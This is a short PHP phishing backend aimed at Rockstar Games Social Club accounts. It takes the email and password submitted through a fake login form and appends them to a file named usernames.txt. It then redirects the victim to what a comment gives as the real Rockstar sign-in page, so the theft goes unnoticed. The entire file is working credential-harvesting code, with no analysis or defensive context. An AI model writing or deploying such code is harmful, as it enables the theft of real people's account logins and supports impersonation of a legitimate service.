<?php
file_put_contents("usernames.txt", "SocialClub Username: " . $email = $_POST['email'] ."\nPassword: ". $pass = $_POST['pass'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://signin.rockstargames.com/
header("Location: $url");
?>